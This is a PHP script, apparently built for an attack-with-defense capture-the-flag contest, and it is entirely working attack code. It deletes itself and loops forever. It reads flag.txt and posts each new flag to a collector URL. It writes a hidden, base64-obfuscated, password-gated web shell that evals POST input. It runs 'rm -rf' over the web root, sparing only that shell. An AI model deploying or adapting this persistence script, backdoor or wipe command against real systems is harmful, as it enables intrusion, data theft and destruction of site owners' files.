
<?php
function send_post($url, $post_data)
{
    $postdata = http_build_query($post_data);
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-type:application/x-www-form-urlencoded',
            'content' => $postdata,
            'timeout' => 15 * 60
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}
$flag_tmp = "flag{xxx}";
@unlink("awd2021.php");
while (True) {
    $flag = system("cat flag.txt");
    $data = array(
        'flag' => $flag
    );
    if ($flag != $flag_tmp) {
        send_post('http://127.0.0.1/getflag.php', $data);
    }
    $flag_tmp = $flag;
    $shell = base64_decode("PD9waHAgJGtleT0kX0dFVFsia2V5Il07CiRrZXloYXNoPW1kNSgka2V5KTsKaWYoJGtleWhhc2g9PT0iYzQwM2Q1OWZlYTMzMTEzZGY0NGQ0NjVhZWVjMzM2YWIiKSB7CglldmFsKCRfUE9TVFsiYSJdKTsKfQplY2hvImZpbGUgbm90IGZpbmQuIjsKPz4=");
    if (file_exists(".c403d59fea33113df44d465aeec336ab.php") == 0) {
        file_put_contents(".c403d59fea33113df44d465aeec336ab.php", $shell, FILE_APPEND);
    }
    system("rm -rf /var/www/html/* !(.c403d59fea33113df44d465aeec336ab.php)");
}
?>